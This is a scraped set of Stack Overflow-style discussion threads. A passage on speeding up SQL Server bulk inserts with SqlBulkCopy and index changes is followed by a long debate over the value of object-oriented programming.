<li>Drop the Primary key while I am doing the inserting and recreate it later</li>
<li>Do inserts into a temporary table with the same schema and periodically transfer them into the main table to keep the size of the table where insertions are happening small</li>
<li>Anything else?</li>
</ol>

<p>--
Based on the responses I have gotten, let me clarify a little bit:</p>

<p>Portman: I'm using a clustered index because when the data is all imported I will need to access data sequentially in that order.  I don't particularly need the index to be there while importing the data.  Is there any advantage to having a nonclustered PK index while doing the inserts as opposed to dropping the constraint entirely for import?</p>

<p>Chopeen:  The data is being generated remotely on many other machines (my SQL server can only handle about 10 currently, but I would love to be able to add more).  It's not practical to run the entire process on the local machine because it would then have to process 50 times as much input data to generate the output.</p>

<p>Jason: I am not doing any concurrent queries against the table during the import process, I will try dropping the primary key and see if that helps.</p>
 <p>Yes your ideas will help.<br />
Lean on option 1 if there are no reads happening while your loading.<br />
Lean on option 2 if you destination table is being queried during your processing.</p>

<p>@Andrew<br />
Question.  Your inserting in chunks of 300.  What is the total amount your inserting?  SQL server should be able to handle 300 plain old inserts very fast.</p>
 <p>How about increasing the memory allocated to the server or the buffer size used by the server, if possible?</p>
 <p>Have you tried using transactions?</p>

<p>From what you describe, having the server committing 100% of the time to disk, it seems you are sending each row of data in an atomic SQL sentence thus forcing the server to commit (write to disk) every single row.</p>

<p>If you used transactions instead, the server would only commit <em>once</em> at the end of the transaction.</p>

<p>For further help: What method are you using for inserting data to the server? Updating a DataTable using a DataAdapter, or executing each sentence using a string?</p>
 <p>You're already using <a href=""http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlbulkcopy.aspx"">SqlBulkCopy</a>, which is a good start.</p>

<p>However, just using the SqlBulkCopy class does not necessarily mean that SQL will perform a bulk copy. In particular, there are a few requirements that must be met for SQL Server to perform an efficient bulk insert.</p>

<p>Further reading:</p>

<ul>
<li><a href=""http://msdn.microsoft.com/en-us/library/ms190422.aspx"">Prerequisites for Minimal Logging in Bulk Import</a></li>
<li><a href=""http://msdn.microsoft.com/en-us/library/ms190421.aspx"">Optimizing Bulk Import Performance</a></li>
</ul>

<p>Out of curiosity, why is your index set up like that? It seems like ContainerId/BinId/Sequence is <strong>much</strong> better suited to be a nonclustered index. Is there a particular reason you wanted this index to be clustered?</p>
 <p>I think that it sounds like this could be done using <a href=""http://msdn.microsoft.com/en-us/library/ms141026.aspx"" rel=""nofollow"">SSIS packages</a>. They're similar to SQL 2000's DTS packages. I've used them to successfully transform everything from plain text CSV files, from existing SQL tables, and even from XLS files with 6-digit rows spanned across multiple worksheets. You could use C# to transform the data into an importable format (CSV, XLS, etc), then have your SQL server run a scheduled SSIS job to import the data.</p>

<p>It's pretty easy to create an SSIS package, there's a wizard built-into SQL Server's Enterprise Manager tool (labeled ""Import Data"" I think), and at the end of the wizard it gives you the option of saving it as an SSIS package. There's a bunch more info <a href=""http://technet.microsoft.com/en-us/sqlserver/bb671392.aspx"" rel=""nofollow"">on Technet</a> as well.</p>
 <p><a href=""http://www.databasejournal.com/features/mssql/article.php/3391761"" rel=""nofollow"">BCP</a> - it's a pain to set up, but it's been around since the dawn of DBs and it's very very quick.</p>

<p>Unless you're inserting data in that order the 3-part index will really slow things.  Applying it later will really slow things too, but will be in a second step.</p>

<p>Compound keys in Sql are always quite slow, the bigger the key the slower.</p>
 <p>My guess is that you'll see a dramatic improvement if you change that index to be <strong>nonclustered</strong>. This leaves you with two options:</p>

<ol>
<li>Change the index to nonclustered, and leave it as a heap table, without a clustered index</li>
<li>Change the index to nonclustered, but then add a surrogate key (like ""id"") and make it an identity, primary key, and clustered index</li>
</ol>

<p>Either one will speed up your inserts <strong>without</strong> noticeably slowing down your reads. </p>

<p>Think about it this way -- right now, you're telling SQL to do a bulk insert, but then you're asking SQL to reorder the entire table every table you add anything. With a nonclustered index, you'll add the records in whatever order they come in, and then build a separate index indicating their desired order. </p>
 <p>I'm not really a bright guy and I don't have a lot of experience with the SqlClient.SqlBulkCopy method but here's my 2 cents for what it's worth.  I hope it helps you and others (or at least causes people to call out my ignorance ;).</p>

<p>You will never match a raw file copy speed unless your database data file (mdf) is on a separate physical disk from your transaction log file (ldf).  Additionally, any clustered indexes would also need to be on a separate physical disk for a fairer comparison.</p>

<p>Your raw copy is not logging or maintaining a sort order of select fields (columns) for indexing purposes.</p>

<p>I agree with Portman on creating a nonclustered identity seed and changing your existing nonclustered index to a clustered index.</p>

<p>As far as what construct you're using on the clients...(data adapter, dataset, datatable, etc).  If your disk io on the server is at 100%, I don't think your time is best spent analyzing client constructs as they appear to be faster than the server can currently handle.</p>

<p>If you follow Portman's links about minimal logging, I wouldn't think surrounding your bulk copies in transactions would help a lot if any but I've been wrong many times in my life ;)</p>

<p>This won't necessarily help you right now but if you figure out your current issue, this next comment might help with the next bottleneck (network throughput) - especially if it's over the Internet...</p>

<p>Chopeen asked an interesting question too.  How did you determine to use 300 record count chunks to insert?  SQL Server has a default packet size (I believe it is 4096 bytes) and it would make sense to me to derive the size of your records and ensure that you are making efficient use of the packets transmitting between client and server.  (Note, you can change your packet size on your client code as opposed to the server option which would obviously change it for all server communications - probably not a good idea.)  For instance, if your record size results in 300 record batches requiring 4500 bytes, you will send 2 packets with the second packet being mostly wasted.  If batch record count was arbitrarily assigned, it might make sense to do some quick easy math.</p>

<p>From what I can tell (and remember about data type sizes) you have exactly 20 bytes for each record (if int=4 bytes and smallint=2 bytes).  If you are using 300 record count batches, then you are trying to send 300 x 20 = 6,000 bytes (plus I'm guessing a little overhead for the connection, etc).  You might be more efficient to send these up in 200 record count batches (200 x 20 = 4,000 + room for overhead) = 1 packet.  Then again, your bottleneck still appears to be the server's disk io.</p>

<p>I realize you're comparing a raw data transfer to the SqlBulkCopy with the same hardware/configuration but here's where I would go also if the challenge was mine:</p>

<p>This post probably won't help you anymore as it's rather old but I would next ask what your disk's RAID configuration is and what speed of disk are you using?  Try putting the log file on a drive that uses RAID 10 with a RAID 5 (ideally 1) on your data file.  This can help reduce a lot of spindle movement to different sectors on the disk and result in more time reading/writing instead of the unproductive ""moving"" state.  If you already separate your data and log files, do you have your index on a different physical disk drive from your data file (you can only do this with clustered indexes).  That would allow for not only concurrently updating logging information with data inserting but would allow index inserting (and any costly index page operations) to occur concurrently.</p>
 <p>Here's how you can disable/enable indexes in SQL Server:</p>

<pre><code>--Disable Index ALTER INDEX [IX_Users_UserID] SalesDB.Users DISABLE
GO
--Enable Index ALTER INDEX [IX_Users_UserID] SalesDB.Users REBUILD</code></pre>

<p>Here are some resources to help you find a solution:</p>

<p><a href=""http://weblogs.sqlteam.com/mladenp/archive/2006/07/17/10634.aspx"">Some bulk loading speed comparisons</a></p>

<p><a href=""http://www.sqlteam.com/article/use-sqlbulkcopy-to-quickly-load-data-from-your-client-to-sql-server"">Use SqlBulkCopy to Quickly Load Data from your Client to SQL Server</a></p>

<p><a href=""http://msdn.microsoft.com/en-us/library/aa178096%28SQL.80%29.aspx"">Optimizing Bulk Copy Performance</a></p>

<p>Definitely look into NOCHECK and TABLOCK options:</p>

<p><a href=""http://msdn.microsoft.com/en-us/library/ms187373.aspx"">Table Hints (Transact-SQL)</a></p>

<p><a href=""http://msdn.microsoft.com/en-us/library/ms174335.aspx"">INSERT (Transact-SQL)</a></p>
"
"What's the point of OOP? <p>As far as I can tell, in spite of the countless millions or billions spent on OOP education, languages, and tools, OOP has not improved developer productivity or software reliability, nor has it reduced development costs. Few people use OOP in any rigorous sense (few people adhere to or understand principles such as LSP); there seems to be little uniformity or consistency to the approaches that people take to modelling problem domains.  All too often, the class is used simply for its syntactic sugar; it puts the functions for a record type into their own little namespace.</p>

<p>I've written a large amount of code for a wide variety of applications. Although there have been places where true substitutable subtyping played a valuable role in the application, these have been pretty exceptional. In general, though much lip service is given to talk of ""re-use"" the reality is that unless a piece of code does <em>exactly</em> what you want it to do, there's very little cost-effective ""re-use"".  It's extremely hard to design classes to be extensible <em>in the right way</em>, and so the cost of extension is normally so great that ""re-use"" simply isn't worthwhile.</p>

<p>In many regards, this doesn't surprise me.  The real world isn't ""OO"", and the idea implicit in OO--that we can model things with some class taxonomy--seems to me very fundamentally flawed (I can sit on a table, a tree stump, a car bonnet, someone's lap--but not one of those is-a chair).  Even if we move to more abstract domains, OO modelling is often difficult, counterintuitive, and ultimately unhelpful (consider the classic examples of circles/ellipses or squares/rectangles).</p>

<p>So what am I missing here? Where's the value of OOP, and why has all the time and money failed to make software any better?</p>
 <p>Verging on religious but I would say that you're painting an overly grim picture of the state of modern OOP. I would argue that it actually <strong>has</strong> reduced costs, made large software projects manageable, and so forth. That doesn't mean it's solved the fundamental problem of software messiness, and it doesn't mean the average developer is an OOP expert. But the modularization of function into object-components has certainly reduced the amount of spaghetti code out there in the world.</p>

<p>I can think of dozens of libraries off the top of my head which are beautifully reusable and which have saved time and money that can never be calculated.</p>

<p>But to the extent that OOP has been a waste of time, I'd say it's because of lack of programmer training, compounded by the steep learning curve of learning a language specific OOP mapping. Some people ""get"" OOP and others never will.</p>
 <blockquote>
  <p>The real world isn't ""OO"", and the idea implicit in OO--that we can model things with some class taxonomy--seems to me very fundamentally flawed</p>
</blockquote>

<p>While this is true and has been observed by other people (take Stepanov, inventor of the STL), the rest is nonsense. OOP may be flawed and it certainly is no silver bullet but it makes large-scale applications much simpler because it's a great way to reduce dependencies. Of course, this is only true for “good” OOP design. Sloppy design won't give any advantage. But good, decoupled design can be modelled very well using OOP and not well using other techniques.</p>

<p>There are much better, more universal models (<a href=""http://stackoverflow.com/questions/16770/haskells-algebraic-data-types"" rel=""nofollow"">Haskell's type model</a> comes to mind) but these are also often more complicated and/or difficult to implement efficiently. OOP is a good trade-off between extremes.</p>
 <p>I have been writing OO code for the last 9 years or so.  Other than using messaging, it's hard for me to imagine other approach.  The main benefit I see totally in line with what CodingTheWheel said: modularisation.  OO naturally leads me to construct my applications from modular components that have clean interfaces and clear responsibilities (i.e. loosely coupled, highly cohesive code with a clear separation of concerns).  </p>

<p>I think where OO breaks down is when people create deeply nested class heirarchies.  This can lead to complexity.  However, factoring out common finctionality into a base class, then reusing that in other descendant classes is a deeply elegant thing, IMHO!</p>
 <p>@CodingTheWheel</p>

<blockquote>
  <p>But to the extent that OOP has been a waste of time, I'd say it's because of lack of programmer training, compounded by the steep learning curve of learning a language specific OOP mapping. Some people ""get"" OOP and others never will.</p>
</blockquote>

<p>I dunno if that's really surprising, though.  I think that technically sound approaches (LSP being the obvious thing) make <em>hard to use</em>, but if we don't use such approaches it makes the code brittle and inextensible anyway (because we can no longer reason about it).  And I think the counterintuitive results that OOP leads us to makes it unsurprising that people don't pick it up.</p>

<p>More significantly, since software is already fundamentally too hard for normal humans to write reliably and accurately, should we really be extolling a technique that is consistently taught poorly and appears hard to learn? If the benefits were clear-cut then it might be worth persevering in spite of the difficulty, but that doesn't seem to be the case.</p>
 <p>@Sean</p>

<blockquote>
  <p>However, factoring out common finctionality into a base class, then reusing that in other descendant classes is a deeply elegant thing, IMHO!</p>
</blockquote>

<p>But ""procedural"" developers have been doing that for decades anyway.  The syntax and terminology might differ, but the effect is identical.  There is more to OOP than ""reusing common functionality in a base class"", and I might even go so far as to say that that is hard to describe as OOP at all; calling the same function from different bits of code is a technique as old as the subprocedure itself.</p>
 <p>@Konrad</p>

<blockquote>
  <p>OOP may be flawed and it certainly is no silver bullet but it makes large-scale applications much simpler because it's a great way to reduce dependencies</p>
</blockquote>

<p>That is the dogma. I am not seeing what makes OOP significantly better in this regard than procedural programming of old. Whenever I make a procedure call I am isolating myself from the specifics of the implementation.</p>
 <p>""Even if there is no actual [information architecture], it doesn’t mean we don’t experience or perceive it as such. Zen Buddhists say there is no actual “self” but they still name their kids.""-Andrew Hinton</p>
 <p>Its a programming paradigm.. Designed to make it easier for us mere mortals to break down a problem into smaller, workable pieces..</p>

<p>If you dont find it useful.. Don't use it, don't pay for training and be happy.</p>

<p>I on the other hand do find it useful, so I will :)</p>
 <p>Relative to straight procedural programming, the first fundamental tenet of OOP is the notion of information hiding and encapsulation. This idea leads to the notion of the <strong><em>class</em></strong> that seperates the interface from implementation. These are hugely important concepts and the basis for putting a framework in place to think about program design in a different way and better (I think) way. You can't really argue against those properties - there is no trade-off made and it is always a cleaner way to modulize things.</p>

<p>Other aspects of OOP including inheritance and polymorphism are important too, but as others have alluded to, those are commonly over used. ie: Sometimes people use inheritance and/or polymorphism because they can, not because they should have. They are powerful concepts and very useful, but need to be used wisely and are not automatic winning advantages of OOP.</p>

<p>Relative to re-use. I agree re-use is over sold for OOP. It is a possible side effect of well defined objects, typically of more primitive/generic classes and is a direct result of the encapsulation and information hiding concepts. It is potentially easier to be re-used because the interfaces of well defined classes are just simply clearer and somewhat self documenting.</p>
 <p>@Jeff</p>

<blockquote>
  <p>Relative to straight procedural programming, the first fundamental tenet of OOP is the notion of information hiding and encapsulation. This idea leads to the notion of the class that seperates the interface from implementation.</p>
</blockquote>

<p>Which has the more hidden implementation: C++'s iostreams, or C's FILE*s?</p>

<p>I think the use of opaque context objects (HANDLEs in Win32, FILE*s in C, to name two well-known examples--hell, HANDLEs live on the other side of the kernel-mode barrier, and it really doesn't get much more encapsulated than that) is found in procedural code too; I'm struggling to see how this is something particular to OOP.</p>

<p>I suppose that may be a part of why I'm struggling to see the benefits: the parts that are obviously good are not specific to OOP, whereas the parts that are specific to OOP are not obviously good! (this is not to say that they are necessarily bad, but rather that I have not seen the evidence that they are widely-applicable and consistently beneficial).</p>
 <p>OOP <em>has</em> reduced costs, and increased efficiency.</p>

<p>When I made the jump from classic ASP/VBScript to C# I noticed a HUGE increase in productivity thanks to OOP.</p>
 <blockquote>
  <p>I think the use of opaque context objects (HANDLEs in Win32, FILE*s in C, to name two well-known examples--hell, HANDLEs live on the other side of the kernel-mode barrier, and it really doesn't get much more encapsulated than that) is found in procedural code too; I'm struggling to see how this is something particular to OOP.</p>
</blockquote>

<p><code>HANDLE</code>s (and the rest of the WinAPI) <em>is</em> OOP! C doesn't support OOP very well so there's no special syntax but that doesn't mean it doesn't use the same concepts. WinAPI is in every sense of the word an object-oriented framework.</p>

<p>See, this is the trouble with every single discussion involving OOP or alternative techniques: nobody is clear about the definition, everyone is talking about something else and thus no consensus can be reached. Seems like a waste of time to me.</p>
 <blockquote>
  <p>HANDLEs (and the rest of the WinAPI) is OOP! </p>
</blockquote>

<p>Are they, though?  They're not inheritable, they're certainly not substitutable, they lack well-defined classes... I think they fall a long way short of ""OOP"".</p>
 <blockquote>
  <blockquote>
    <p>HANDLEs (and the rest of the WinAPI) is OOP!</p>
  </blockquote>
  
  <p>Are they, though? They're not inheritable, they're certainly not substitutable, they lack well-defined classes... I think they fall a long way short of ""OOP"".</p>
</blockquote>

<p>Have you ever created a window using WinAPI? Then you should know that you define a class (<code>RegisterClass</code>), create an instance of it (<code>CreateWindow</code>), call virtual methods (<code>WndProc</code>) and base-class methods (<code>DefWindowProc</code>) and so on. WinAPI even takes the nomenclature from SmallTalk OOP, calling the methods “messages” (Window Messages).</p>

<p>Handles may not be inheritable but then, there's <code>final</code> in Java. They don't lack a class, they <em>are</em> a placeholder for the class: That's what the word “handle” means. Looking at architectures like MFC or .NET WinForms it's immediately obvious that except for the syntax, nothing much is different from the WinAPI.</p>
 <blockquote>
  <p>All too often, the class is used
  simply for its syntactic sugar; it
  puts the functions for a record type
  into their own little namespace.  </p>
</blockquote>

<p>Yes, I find this to be too prevalent as well. This is not Object Oriented Programming. It's Object Based Programming and data centric programing. In my 10 years of working with OO Languages, I see people mostly doing Object Based Programming. OBP breaks down very quickly IMHO since you are essentially getting the worst of both words: 1) Procedural programming without adhering to proven structured programming methodology and 2) OOP without adhering to to proven OOP methodology.  </p>

<p>OOP done right is a beautiful thing. It makes very difficult problems easy to solve, and to the uninitiated (not trying to sound pompous there), it can almost seem like magic. That being said, OOP is just one tool in the toolbox of programming methodologies. It is not the be all end all methodology. It just happens to suit large business applications well.   </p>

<p>Most developers who work in OOP languages are utilizing examples of OOP done right in the frameworks and types that they use day-to-day, but they just aren't aware of it. Here are some very simple examples: ADO.NET, Hibernate/NHibernate, Logging Frameworks, various language collection types, the ASP.NET stack, The JSP stack etc... These are all things that heavily rely on OOP in their codebases.</p>
 <blockquote>
  <p>Have you ever created a window using WinAPI?</p>
</blockquote>

<p>More times than I care to remember.</p>

<blockquote>
  <p>Then you should know that you define a class (RegisterClass), create an instance of it (CreateWindow), call virtual methods (WndProc) and base-class methods (DefWindowProc) and so on. WinAPI even takes the nomenclature from SmallTalk OOP, calling the methods “messages” (Window Messages).</p>
</blockquote>

<p>Then you'll also know that it does no message dispatch of its own, which is a big gaping void. It also has crappy subclassing.</p>

<blockquote>
  <p>Handles may not be inheritable but then, there's final in Java. They don't lack a class, they are a placeholder for the class: That's what the word “handle” means. Looking at architectures like MFC or .NET WinForms it's immediately obvious that except for the syntax, nothing much is different from the WinAPI.</p>
</blockquote>

<p>They're not inheritable either in interface or implementation, minimally substitutable, and they're not substantially different from what procedural coders have been doing since forever.</p>

<p>Is this really it?  The best bits of OOP are just... traditional procedural code?  <em>That's</em> the big deal?</p>
 <p>OOP isn't about creating re-usable classes, its about creating Usable classes.</p>
 <p>There's no empirical evidence that suggests that object orientation is a more natural way for people to think about the world. There's some work in the field of psychology of programming that shows that OO is not somehow more fitting than other approaches.</p>

<blockquote>
  <p>Object-oriented representations do not appear to be universally more usable or less usable.</p>
  
  <p>It is not enough to simply adopt OO methods and require developers to use such methods, because that might have a negative impact on developer productivity, as well as the quality of systems developed.</p>
</blockquote>

<p>Which is from ""On the Usability of OO Representations"" from Communications of the ACM Oct. 2000. The articles mainly compares OO against theprocess-oriented approach. There's lots of study of how people who work with the OO method ""think"" (Int. J. of Human-Computer Studies 2001, issue 54, or Human-Computer Interaction 1995, vol. 10 has a whole theme on OO studies), and from what I read, there's nothing to indicate some kind of naturalness to the OO approach that makes it better suited than a more traditional procedural approach.</p>
 <p>In my experience of reviewing code and design of projects I have been through, the value of OOP is not fully realised because alot of developers have <strong>not properly conceptualised the object-oriented model</strong> in their minds. Thus they do not program with OO design, very often continuing to write top-down procedural code making the classes a pretty <em>flat</em> design. (if you can even call that ""design"" in the first place)</p>

<p>It is pretty scary to observe how little colleagues know about what an abstract class or interface are, let alone properly design an inheritance hierarchy to suit the business needs.</p>

<p>However, when good OO design is present, it is just sheer joy reading the code and seeing the code naturally fall into place into intuitive components/classes. I have always perceived system architecture and design like designing the various departments and staff jobs in a company - all are there to accomplish a certain piece of work in the grand scheme of things, emitting the synergy required to propel the organisation/system forward.</p>

<p>That, of course, is quite <em>rare</em> unfortunately. Like the ratio of beautifully-designed versus horrendously-designed physical objects in the world, the same can pretty much be said about software engineering and design. Having the good tools at one's disposal does not necessarily confer good practices and results.</p>
 <p>Maybe a bonnet, lap or a tree is not a chair but they all are ISittable.</p>
 <blockquote>
  <p>Maybe a bonnet, lap or a tree is not a chair but they all are ISittable.</p>
</blockquote>

<p>Yes, but only ex post facto. They're ISittable because someone sat on them. </p>
 <p>I know I find OOP useful pretty much solely on a syntactical sugar basis (encapsulation, operator overloading, typechecking). As to the benefits of OOP... I don't know. I don't think it's <em>worse</em> than procedural stuff. </p>

<p>On the lighter side, my OOP lecturer said that OOP is important because otherwise the ""code would have too many loops"". Yeah. Sometimes it's depressing that I pay $500 per paper. :(</p>
 <p>I agree completely with <a href=""http://stackoverflow.com/questions/24270/whats-the-point-of-oop#24308"" rel=""nofollow"">InSciTek Jeff</a>'s answer, I'll just add the following refinements:</p>

<ul>
<li>Information hiding and encapsulation: Critical for any maintainable code.  Can be done by being careful in any programming language, doesn't require OO features, but doing it will make your code slightly OO-like.</li>
<li>Inheritance: There is one important application domain for which all those OO <em>is-a-kind-of</em> and <em>contains-a</em> relationships are a perfect fit:  Graphical User Interfaces.  If you try to build GUIs without OO language support, you will end up building OO-like features anyway, and it's harder and more error-prone without language support.  Glade (recently) and X11 Xt (historically) for example.</li>
</ul>

<p>Using OO features (especially deeply nested abstract hierarchies), when there is no point, is pointless.  But for some application domains, there really is a point.</p>
 <p>Reuse shouldn't be a goal of OOP - or any other paradigm for that matter.</p>

<p>Reuse is a side-effect of an good design and proper level of abstraction.  Code achieves reuse by doing something useful, but not doing so much as to make it inflexible.  It does not matter whether the code is OO or not - we reuse what works and is not trivial to do ourselves.  That's pragmatism.</p>

<p>The thought of OO as a new way to get to reuse through inheritance is fundamentally flawed.  As you note the LSP violations abound.  Instead, OO is properly thought of as a method of managing the complexity of a problem domain.  The goal is maintainability of a system over time.  The primary tool for achieving this is the separation of public interface from a private implementation.  This allows us to have rules like ""This should only be modified using ..."" enforced by the compiler, rather than code review.</p>

<p>Using this, I'm sure you will agree, allows us to create and maintain hugely complex systems.  There is lots of value in that, and it is not easy to do in other paradigms.</p>
 <p>I believe the most beneficial quality of OOP is data hiding/managing. However, there are a LOT of examples where OOP is misused and I think this is where the confusion comes in. </p>

<p>Just because you can make something into an object does not mean you should. However, if doing so will make your code more organized/easier to read then you definitely should.</p>

<p>A great practical example where OOP is very helpful is with a ""product"" class and objects that I use on our website. Since every page is a product, and every product has references to other products, it can get very confusing as to which product the data you have refers to. Is this ""strURL"" variable the link to the current page, or to the home page, or to the statistics page? Sure you could make all kinds of different variable that refer to the same information, but proCurrentPage->strURL, is much easier to understand (for a developer).</p>

<p>In addition, attaching functions to those pages is much cleaner. I can do proCurrentPage->CleanCache(); Followed by proDisplayItem->RenderPromo(); If I just called those functions and had it assume the current data was available, who knows what kind of evil would occur. Also, if I had to pass the correct variables into those functions, I am back to the problem of having all kinds of variables for the different products laying around.</p>

<p>Instead, using objects, all my product data and functions are nice and clean and easy to understand.</p>

<p>However. The big problem with OOP is when somebody believes that EVERYTHING should be OOP. This creates a lot of problems. I have 88 tables in my database. I only have about 6 classes, and maybe I should have about 10. I definitely don't need 88 classes. Most of the time directly accessing those tables is perfectly understandable in the circumstances I use it, and OOP would actually make it more difficult/tedious to get to the core functionality of what is occurring.</p>

<p>I believe a hybrid model of objects where useful and procedural where practical is the most effective method of coding. It's a shame we have all these religious wars where people advocate using one method at the expense of the others. They are both good, and they both have their place. Most of the time, there are uses for both methods in every larger project (In some smaller projects, a single object, or a few procedures may be all that you need).</p>
 <p>Yes OOP did not solve all our problems, sorry about that. We are, however working on SOA which will solve all those problems.</p>
 <p>""The real world isn't ""OO"",""</p>

<p>Really?  My world is full of objects.  I'm using one now.  I think that having software ""objects"" model the real objects might not be such a bad thing.</p>

<p>OO designs for conceptual things (like Windows, not real world windows, but the display panels on my computer monitor) often leave a lot to be desired.  But for real world things like invoices, shipping orders, insurance claims and what-not, I think those real world things are objects.  I have a stack on my desk, so they must be real.</p>
 <blockquote>
  <p>I think those real world things are objects</p>
</blockquote>

<p>You do?</p>

<p>What methods does an invoice have?  Oh, wait.  It can't pay itself, it can't send itself, it can't compare itself with the items that the vendor actually delivered.  It doesn't have any methods at all; it's totally inert and non-functional. It's a record type (a struct, if you prefer), not an object.</p>

<p>Likewise the other things you mention.</p>

<p>Just because something is real does not make it an object in the OO sense of the word.  OO objects are a peculiar coupling of state and behaviour that can act of their own accord.  That isn't something that's abundant in the real world.</p>
 <p>To me, the value of OOP is to reduce the scope and to separate state from behavior. With smaller scope, code is easier to understand.</p>

<p>It can be done in most languages, all is needed to achieve this is a way for a state to delegate a method call to a behavior, and a way for a behavior to further delegate the call to a parent behavior.</p>

<p>As to have a set of classes model a domain in an effective way, there is no magic method. Like a piano, we have to practice. OOP is an abstract tool, it can help you build code in a simpler way, but it can't think and analyze the domain of your app for you.</p>

<p>What works for me is to stay close to the domain as long as possible, while still avoiding most code duplications.</p>
 <p>OOP lends itself well to programming internal computer structures like GUI ""widgets"", where for example SelectList and TextBox may be subtypes of Item, which has common methods such as ""move"" and ""resize"".</p>

<p>The trouble is, 90% of us work in the world of business where we are working with business concepts such as Invoice, Employee, Job, Order.  These <strong>do not</strong> lend themselves so well to OOP because the ""objects"" are more nebulous, subject to change according to business re-engineering and so on.  </p>

<p>The worst case is where OO is enthusiastically applied to databases, including the egregious OO ""enhancements"" to SQL databases - which are rightly ignored except by database noobs who assume they must be the right way to do things because they are newer.</p>
 <p>I agree with InSciTek Jeff. Even if you don't use OO in its purest sense, Encapsulation Theory can help reduce potential structural complexity:
<a href=""http://www.edmundkirwan.com"" rel=""nofollow"">http://www.edmundkirwan.com</a></p>

<p>@ DrPizza</p>

<p>If procedureal programming uses the benefits of encapsulation to the same degree then good on it!</p>
 <p>The point of OOP is to give the programmer another means for describing and communicating a solution to a problem in code to machines and people.  The most important part of that is the communication to people.  OOP allows the programmer to declare what they mean in the code through rules that are enforced in the OO language.</p>

<p>Contrary to many arguments on this topic, OOP and OO concepts are pervasive throughout all code including code in non-OOP languages such as C.  Many advanced non-OO programmers will approximate the features of objects even in non-OO languages.</p>

<p>Having OO built into the language merely gives the programmer another means of expression.</p>

<p>The biggest part to writing code is not communication with the machine, that part is easy, the biggest part is communication with human programmers.</p>
 <p><em>In the only dev blog I read,</em> by that Joel-On-Software-Founder-of-SO guy, I read a long time ago that OO does not lead to productivity increases. Automatic memory management does. Cool. Who can deny the data?</p>

<h2>I still believe that OO is to non-OO what programming with functions is to programming everything inline.</h2> (And I should know, as I started with GWBasic.) When you refactor code to use functions, <code>variable2654</code> becomes <code>variable3</code> of the method you're in. Or, better yet, it's got a name that you can understand, <strong>and if the function is short,</strong> it's called <code>value</code>  and that's sufficient for full comprehension. 

When code with no functions becomes code with methods, you get to delete miles of code.

When you refactor code to be truly OO, <code>b</code>, <code>c</code>, <code>q</code>, and <code>Z</code> become <code>this</code>, <code>this</code>, <code>this</code> and <code>this</code>. And since I don't believe in using the <code>this</code> keyword, you get to delete miles of code. Actually, you get to do that even if you use <code>this</code>.

<br/><br/>

<h2>I do not think OO is natural metaphor.</h2> I don't think language is a natural metaphor either, nor do I think that Fowler's ""smells"" are better than saying ""this code tastes bad."" That said, I think that OO is not about natural metaphors and people who think the <strong>objects just pop out at you</strong> are basically missing the point. **You define the object universe,** and better object universes result in code that is shorter, easier to understand, works better, or all of these (and some criteria I am forgetting). I think that people who use the customers/domain's natural objects as programming objects are missing the power to redefine the universe. 

For instance, when you do an airline reservation system, what you call a reservation might not correspond to a legal/business reservation at all.

<br/><br/>
<h2>Some of the basic concepts are really cool tools</h2> I think that most people exaggerate with that whole ""when you have a hammer, they're all nails"" thing. I think that the other side of the coin/mirror is just as true: when you have a gadget like polymorphism/inheritance, you begin to find uses where it fits like a glove/sock/contact-lens. The tools of OO are very powerful. Single-inheritance is, I think, absolutely necessary for people not to get carried away, my own <a href=""http://thekbase.com"" rel=""nofollow"">multi-inheritance software not withstanding.</a>

<br/><br/>
<h2>What's the point of OOP?</h2> I think it's a great way to handle an absolutely massive code base. I think it lets you organize and reorganize  you code and gives you a language to do that in (beyond the programming language you're working in), and modularizes code in a pretty natural and easy-to-understand way.
<br/><br/>
<h2>OOP is destined to be misunderstood by the majority of developers</h2> This is because it's an eye-opening process like life: you understand OO more and more with experience, and start avoiding certain patterns and employing others as you get wiser. One of the best examples is that you stop using inheritance for classes that you do not control, and prefer the <i>Facade</i> pattern instead.

<br/><br/>
<h2>Regarding your mini-essay/question</h2> 

<p>I did want to mention that you're right. Reusability is a pipe-dream, for the most part. Here's a quote from Anders Hejilsberg about that topic (brilliant) <a href=""http://www.artima.com/intv/handcuffs.html"" rel=""nofollow"">from here</a>:</p>

<blockquote>
  <p>If you ask beginning programmers to
  write a calendar control, they often
  think to themselves, ""Oh, I'm going to
  write the world's best calendar
  control! It's going to be polymorphic
  with respect to the kind of calendar.
  It will have displayers, and mungers,
  and this, that, and the other."" They
  need to ship a calendar application in
  two months. They put all this
  infrastructure into place in the
  control, and then spend two days
  writing a crappy calendar application
  on top of it. They'll think, ""In the
  next version of the application, I'm
  going to do so much more.""</p>
  
  <p>Once they start thinking about how
  they're actually going to implement
  all of these other concretizations of
  their abstract design, however, it
  turns out that their design is
  completely wrong. And now they've
  painted themself into a corner, and
  they have to throw the whole thing
  out. I have seen that over and over.
  I'm a strong believer in being
  minimalistic. Unless you actually are
  going to solve the general problem,
  don't try and put in place a framework
  for solving a specific one, because
  you don't know what that framework
  should look like.</p>
</blockquote>
 <p>It's the <strong>only</strong> language-portable methodology for keeping variables grouped together with the functions/methods/subroutines that interact with them.</p>
 <p>To me, there is a lot of value in the OOP syntax itself.  Using objects that attempt to represent real things or data structures is often much more useful than trying to use a bunch of different flat (or ""floating"") functions to do the same thing with the same data.  There is a certain natural ""flow"" to things with good OOP that just makes more sense to read, write, and maintain long term.</p>

<p>It doesn't necessarily matter that an Invoice isn't really an ""object"" with functions that it can perform itself - the object instance can exist just to perform functions on the data without having to know what type of data is actually there. The function ""invoice.toJson()"" can be called successfully without having to know what kind of data ""invoice"" is - the result will be Json, no matter it if comes from a database, XML, CSV, or even another JSON object.  With procedural functions, you all the sudden have to know more about your data, and end up with functions like ""xmlToJson()"", ""csvToJson()"", ""dbToJson()"", etc.  It eventually becomes a complete mess and a HUGE headache if you ever change the underlying data type.</p>

<p>The point of OOP is to hide the actual implementation by abstracting it away.  To achieve that goal, you must create a public interface.  To make your job easier while creating that public interface and keep things DRY, you must use concepts like abstract classes, inheritance, polymorphism, and design patterns.</p>

<p>So to me, the real overriding goal of OOP is to make future code maintenance and changes easier.  But even beyond that, it can really simplify things a lot when done correctly in ways that procedural code never could.  It doesn't matter if it doesn't match the ""real world"" - programming with code is not interacting with real world objects anyways.  OOP is just a tool that makes my job easier and faster - I'll go for that any day.</p>
 <p>OOP helps separate interface from implementation. You do not need OOP support in the language to benefit from OO design.</p>

<p>One small example where OOP has helped tremendously:</p>

<p>The UNIX Virtual File System (VFS) layer presents a uniform interface (open/read/write) using tables of function pointers -- much like the C++ virtual table dispatch. </p>

